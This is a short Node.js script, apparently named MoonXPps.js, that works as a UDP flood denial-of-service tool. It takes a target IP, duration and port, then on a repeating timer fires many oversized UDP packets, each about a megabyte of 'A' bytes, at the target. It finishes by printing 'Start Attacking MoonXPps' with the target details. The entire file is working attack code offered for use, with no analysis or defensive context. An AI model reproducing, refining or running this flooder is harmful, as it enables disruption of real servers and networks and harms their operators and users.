const dgram = require('dgram');

if (process.argv.length <= 2) {
	console.log("node MoonXPps.js <ip> <time> <port>");
	process.exit(-1);
}

const target = process.argv[2];
const time = process.argv[3];
const port = process.argv[4];

function generatePayload(size) {
    let payload = Buffer.alloc(size);
    payload.fill('A');
    return payload;
}

const payload = generatePayload(1002400);

setInterval(() => {
    const socket = dgram.createSocket('udp4');
    for (let p = 0; p < time; p++) {
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);

    }
    socket.send(payload, 0, payload.length, port, target, (err) => {
        if (err) {
            console.error(err);
        }
        socket.close();
    });
});

console.clear();
console.log(`
Start Attacking MoonXPps
Target: ${target}
Port: ${port}
`);
